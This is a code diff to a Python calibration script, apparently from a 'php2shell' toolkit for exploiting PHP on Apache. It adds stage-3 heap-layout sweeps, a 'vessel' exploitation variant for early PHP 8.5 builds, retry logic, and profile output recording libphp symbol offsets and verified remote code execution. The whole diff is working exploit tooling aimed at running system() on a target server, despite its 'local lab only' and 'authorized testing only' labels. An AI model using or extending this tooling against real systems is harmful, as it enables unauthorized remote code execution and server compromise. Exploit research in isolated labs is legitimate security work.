@@ -28,7 +28,12 @@ Usage (local lab only; calibration needs container access):
         --proof-file /tmp/php2shell-rce/out/p1
 
 Options --stage1-n / --stage1-len / --stage2-t / --stage3-htdata / --stage3-pads
-skip the corresponding search when you already know the values.
+skip the corresponding search when you already know the values. --stage3-sweep
+START:END:STEP replaces the known-layout list with an htdata range (use with
+--stage3-pads) for builds whose layout none of the known offsets matches.
+--stage3-mode vessel switches stage 3 to the variant for early-8.5 layouts
+(see tools/php2shell_vessel.py); --stage3-early / --pad / --stage3-blobs /
+--stage3-vessel-index shape it.
 
 Authorized testing only.
 """
@@ -47,7 +52,11 @@ import time
 import urllib.parse
 
 from php2shell_paths import default_repo_dir
-from php2shell_upstream import patch_params, patch_tls
+from php2shell_upstream import patch_cookie_decode, patch_params, patch_tls
+from php2shell_vessel import DEFAULT_HTDATA as VESSEL_HTDATA
+from php2shell_vessel import DEFAULTS as VESSEL_DEFAULTS
+from php2shell_vessel import fire as vessel_fire
+from php2shell_vessel import parse_pads as parse_vessel_pads
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
@@ -105,6 +114,18 @@ def extract_symbols(repo: str, container: str) -> dict:
     script = os.path.join(repo, "docker", "offsets.py")
     if not os.path.isfile(script):
         raise SystemExit(f"{script} not found")
+    # The upstream script only knows /usr/lib/apache2/modules/libphp.so;
+    # official php:7.4 images name the module libphp7.so. Bridge the two
+    # with a real copy (docker cp preserves symlinks, so a symlink would
+    # arrive on the host dangling) and never shadow a real libphp.so.
+    probe = subprocess.run(
+        ["docker", "exec", container, "sh", "-c",
+         "test -e /usr/lib/apache2/modules/libphp7.so"
+         " && ! test -e /usr/lib/apache2/modules/libphp.so"])
+    if probe.returncode == 0:
+        subprocess.run(["docker", "exec", container, "cp", "-L",
+                        "/usr/lib/apache2/modules/libphp7.so",
+                        "/usr/lib/apache2/modules/libphp.so"], check=False)
     print("[*] extracting libphp symbols from", container)
     subprocess.run([sys.executable, script, container], check=True)
     env = os.path.join(repo, "out", "offsets.env")
@@ -267,39 +288,167 @@ def calibrate_stage2(mod, ex, dtor, hints):
     return 0, hints.get("stage2_t", 0)
 
 
+def parse_pads(spec):
+    """Accepts bookworm | lab | an explicit pads spec like '4:4x5,31:31x6'."""
+    if spec is None or spec in ("bookworm", "lab"):
+        return spec
+    pads = []
+    for part in spec.split(","):
+        m = re.fullmatch(r"(\d+):(\d+)(?:x(\d+))?", part.strip())
+        if not m:
+            raise SystemExit(f"bad --stage3-pads item: {part!r} (expected a:bxN)")
+        pads += [(int(m[1]), int(m[2]))] * int(m[3] or 1)
+    return pads
+
+
+def stage3_profile_json(stage3):
+    """(stage3_pads, stage3_carrier) pair for the profile JSON."""
+    if not stage3:
+        return None, None
+    pads = stage3["pads"]
+    if pads == "lab":
+        return [[8, 7]] + [[7, 7]] * 5, False
+    if isinstance(pads, list):
+        return [list(p) for p in pads], bool(stage3.get("carrier"))
+    return [[31, 31]] * 6, True
+
+
+def stage3_carrier_for(pads, override):
+    """Whether this layout uses the upstream 15-byte carrier.
+
+    Explicit pads are calibrated with the non-carrier branch by default: that
+    is the only branch where the per-build fake-reference knobs apply.  Pass
+    --stage3-carrier carrier to measure the carrier layout instead.
+    """
+    if override == "carrier":
+        return True
+    if override == "lab":
+        return False
+    if pads == "lab":
+        return False
+    return not isinstance(pads, list)
+
+
 def calibrate_stage3(mod, ex, chunk, lib, zif, proof, hints):
     if not chunk or not lib:
         return False, None
+    if hints.get("stage3_mode") == "vessel":
+        return calibrate_stage3_vessel(mod, ex, chunk, lib, zif, proof, hints)
+    attempts = max(1, int(hints.get("stage3_attempts") or 5))
+    pads_arg = hints.get("stage3_pads")
+    explicit = None
+    if pads_arg not in (None, "bookworm", "lab"):
+        explicit = parse_pads(pads_arg)
     layouts = []
     if hints.get("stage3_htdata"):
-        layouts.append(("hint", hints["stage3_htdata"], hints.get("stage3_pads", "bookworm")))
+        layouts.append(("hint", hints["stage3_htdata"],
+                        explicit if explicit is not None else (pads_arg or "bookworm")))
+    elif hints.get("stage3_sweep"):
+        start, end, step = hints["stage3_sweep"]
+        pads = explicit if explicit is not None else (pads_arg or "bookworm")
+        layouts = [(f"{hex(off)}/{pads}", off, pads)
+                   for off in range(start, end, step)]
+    elif explicit is not None:
+        for off in (0x690D8, 0x6E0D8, 0x5404A):
+            layouts.append((f"{hex(off)}/explicit", off, explicit))
     else:
         for off in (0x690D8, 0x6E0D8, 0x5404A):
             for pads in ("bookworm", "lab"):
                 layouts.append((f"{hex(off)}/{pads}", off, pads))
     for name, off, pads in layouts:
-        try:
-            if os.path.exists(proof):
-                os.unlink(proof)
-        except OSError:
-            pass
-        if pads == "lab":
-            ex.stage3_carrier = False
-            ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
-        else:
-            ex.stage3_carrier = True
-            ex.stage3_pads = [(31, 31)] * 6
-        try:
-            ex.rotate()
-            ex.stage3(chunk + off, lib + zif)
-        except Exception as exc:
-            print(f"    stage3 {name}: {exc}")
-        if os.path.exists(proof) and os.path.getsize(proof) > 0:
-            with open(proof) as handle:
-                print(f"[+] stage3 {name}: {handle.read().strip()}")
-            return True, {"htdata": off, "pads": pads}
-        print(f"    stage3 {name}: no proof")
+        carrier = stage3_carrier_for(pads, hints.get("stage3_carrier"))
+        for attempt in range(1, attempts + 1):
+            try:
+                if os.path.exists(proof):
+                    os.unlink(proof)
+            except OSError:
+                pass
+            if pads == "lab":
+                ex.stage3_pads = [(8, 7)] + [(7, 7)] * 5
+            elif isinstance(pads, list):
+                ex.stage3_pads = pads
+            else:
+                ex.stage3_pads = [(31, 31)] * 6
+            ex.stage3_carrier = carrier
+            try:
+                # A fresh worker restores the deterministic heap before every
+                # attempt (upstream rotates the same way in its retry loop).
+                ex.rotate()
+                ex.stage3(chunk + off, lib + zif)
+            except Exception as exc:
+                print(f"    stage3 {name} try {attempt}/{attempts}: {exc}")
+            if os.path.exists(proof) and os.path.getsize(proof) > 0:
+                with open(proof) as handle:
+                    print(f"[+] stage3 {name} try {attempt}/{attempts}: "
+                          f"{handle.read().strip()}")
+                return True, {"htdata": off, "pads": pads,
+                              "carrier": carrier,
+                              "mode": "carrier" if carrier else "lab"}
+            if attempts > 1:
+                print(f"    stage3 {name} try {attempt}/{attempts}: no proof")
     return False, None
+
+
+def vessel_params(hints):
+    """Vessel stage-3 parameters, honouring the CLI --pad option."""
+    return {
+        "early": hints.get("stage3_early") or VESSEL_DEFAULTS["early"],
+        "pads": hints.get("pad") or hints.get("stage3_vessel_pads")
+                or [tuple(p) for p in VESSEL_DEFAULTS["pads"]],
+        "blobs": hints.get("stage3_blobs") or VESSEL_DEFAULTS["blobs"],
+        "vessel_index": hints.get("stage3_vessel_index",
+                                  VESSEL_DEFAULTS["vessel_index"]),
+    }
+
+
+def calibrate_stage3_vessel(mod, ex, chunk, lib, zif, proof, hints):
+    """Stage 3 for early-8.5 layouts: S steers the dangling reference onto
+    B2's blob page (tools/php2shell_vessel.py has the technique)."""
+    attempts = max(1, int(hints.get("stage3_attempts") or 5))
+    params = vessel_params(hints)
+    if hints.get("stage3_htdata"):
+        offsets = [hints["stage3_htdata"]]
+    elif hints.get("stage3_sweep"):
+        start, end, step = hints["stage3_sweep"]
+        offsets = list(range(start, end, step))
+    else:
+        offsets = [VESSEL_HTDATA]
+    for off in offsets:
+        for attempt in range(1, attempts + 1):
+            try:
+                if os.path.exists(proof):
+                    os.unlink(proof)
+            except OSError:
+                pass
+            try:
+                # S must be the first heavy request on a fresh worker.
+                ex.rotate()
+                vessel_fire(mod, ex, chunk, zif, off, params)
+            except Exception as exc:
+                print(f"    stage3 {hex(off)}/vessel try {attempt}/{attempts}: {exc}")
+            if os.path.exists(proof) and os.path.getsize(proof) > 0:
+                with open(proof) as handle:
+                    print(f"[+] stage3 {hex(off)}/vessel try {attempt}/{attempts}: "
+                          f"{handle.read().strip()}")
+                return True, {"htdata": off, "mode": "vessel", **params}
+            if attempts > 1:
+                print(f"    stage3 {hex(off)}/vessel try {attempt}/{attempts}: no proof")
+    return False, None
+
+
+def parse_sweep(text: str):
+    """--stage3-sweep START:END:STEP — an inclusive/exclusive htdata range."""
+    parts = text.split(":")
+    if len(parts) != 3:
+        raise argparse.ArgumentTypeError("expected START:END:STEP")
+    try:
+        start, end, step = (int(p, 0) for p in parts)
+    except ValueError:
+        raise argparse.ArgumentTypeError(
+            "START:END:STEP must be integers") from None
+    if step <= 0 or end <= start:
+        raise argparse.ArgumentTypeError("need END > START and STEP > 0")
+    return (start, end, step)
 
 
 def container_arch(container: str) -> str | None:
@@ -324,7 +473,31 @@ def main() -> int:
     ap.add_argument("--stage2-t", type=int)
     ap.add_argument("--stage2-v", type=int, default=16)
     ap.add_argument("--stage3-htdata", type=lambda x: int(x, 0))
-    ap.add_argument("--stage3-pads", choices=("bookworm", "lab"))
+    ap.add_argument("--stage3-pads", default=None,
+                    help='bookworm, lab, or explicit pads spec: "4:4x5,31:31x6"')
+    ap.add_argument("--stage3-carrier", choices=("auto", "carrier", "lab"),
+                    default="auto",
+                    help="stage-3 branch: carrier (15-byte upstream string), "
+                         "lab (fake-reference carriers), or auto (carrier for "
+                         "bookworm, lab for explicit/lab pads)")
+    ap.add_argument("--stage3-attempts", type=int, default=5,
+                    help="attempts per stage-3 layout; stage 3 is probabilistic "
+                         "even when the layout is right (upstream retries 5x)")
+    ap.add_argument("--stage3-sweep", type=parse_sweep, metavar="START:END:STEP",
+                    help="sweep htdata offsets (hex ok) instead of trying the known "
+                         "layouts; pads come from --stage3-pads (default bookworm)")
+    ap.add_argument("--stage3-mode", choices=("carrier", "vessel"), default="carrier",
+                    help="stage-3 variant: upstream carrier layout, or the vessel "
+                         "technique for early-8.5 builds (default: carrier)")
+    ap.add_argument("--stage3-early", type=int,
+                    help="vessel mode: bytes of the S-side early steering field "
+                         "(default 160, one bin-13 page)")
+    ap.add_argument("--pad", type=parse_vessel_pads, metavar="NL:VLxCOUNT,...",
+                    help="vessel mode: S pads (default 7:7x3)")
+    ap.add_argument("--stage3-blobs", type=int,
+                    help="vessel mode: number of B2 fake-HashTable blobs (default 15)")
+    ap.add_argument("--stage3-vessel-index", type=int,
+                    help="vessel mode: blob index carrying the reference pattern (default 1)")
     ap.add_argument("--distro", default="unknown")
     ap.add_argument("--arch", choices=("aarch64", "amd64"), default=None)
     args = ap.parse_args()
@@ -340,6 +513,7 @@ def main() -> int:
         return 3
 
     patch_params(args.repo_dir)
+    patch_cookie_decode(args.repo_dir)
     if args.target.startswith("https://"):
         patch_tls(args.repo_dir)
 
@@ -370,6 +544,7 @@ def main() -> int:
     rce, stage3 = calibrate_stage3(mod, ex, chunk, lib, sym["zif_system"],
                                    args.proof_file, vars(args))
 
+    s3_pads, s3_carrier = stage3_profile_json(stage3)
     profile = {
         "name": f"php-{version}-{args.distro}",
         "php_version": version,
@@ -377,11 +552,17 @@ def main() -> int:
         "fixed_in": f"{branch}.{fixed}" if fixed else None,
         "sapi": "apache2handler",
         "arch": arch,
-        "distro": "debian" if "bookworm" in args.distro else args.distro,
+        "distro": ("debian" if any(x in args.distro for x in
+                                   ("bookworm", "bullseye", "buster", "trixie",
+                                    "deb13", "debian"))
+                   else args.distro),
         "verified": rce,
         "rce": rce,
         "oom_mb": 12,
-        "upstream_profile": "bookworm",
+        "upstream_profile": ("bookworm"
+                             if ((stage3 and stage3.get("mode") == "vessel")
+                                 or s3_carrier in (None, True))
+                             else "lab"),
         "libphp": {
             "zif_system": hex(sym["zif_system"]),
             "zval_ptr_dtor": hex(sym["zval_ptr_dtor"]),
@@ -392,19 +573,24 @@ def main() -> int:
             "stage1_forge_len": forge_len,
             "stage2_t": t_index,
             "stage2_v": args.stage2_v,
-            "stage3_pads": ([[31, 31]] * 6 if stage3 and stage3["pads"] == "bookworm"
-                            else ([(8, 7)] + [(7, 7)] * 5 if stage3 else None)),
-            "stage3_carrier": (stage3["pads"] == "bookworm") if stage3 else None,
+            "stage3_mode": stage3.get("mode") if stage3 else None,
+            "stage3_pads": s3_pads,
+            "stage3_carrier": s3_carrier,
         },
         "config": cfg,
         "measured": {
             "chunk_base": hex(chunk) if chunk else None,
             "libphp_base": hex(lib) if lib else None,
         },
-        "status": ("RCE verified" if rce else
-                    ("leaks calibrated; stage 3 not verified" if (chunk and lib)
-                     else "calibration failed: heap/libphp leak not reproduced")),
+        "status": ("RCE verified" if rce and stage3 and stage3["mode"] != "vessel"
+                   else ("RCE verified (vessel stage 3)" if rce else
+                         ("leaks calibrated; stage 3 not verified" if (chunk and lib)
+                          else "calibration failed: heap/libphp leak not reproduced"))),
     }
+    if stage3 and stage3.get("mode") == "vessel":
+        profile["stages"]["stage3_early"] = stage3["early"]
+        profile["stages"]["stage3_blobs"] = stage3["blobs"]
+        profile["stages"]["stage3_vessel_index"] = stage3["vessel_index"]
     os.makedirs(args.out_dir, exist_ok=True)
     path = os.path.join(args.out_dir, f"{version}-{args.distro}.json")
     with open(path, "w", encoding="utf-8") as fh:
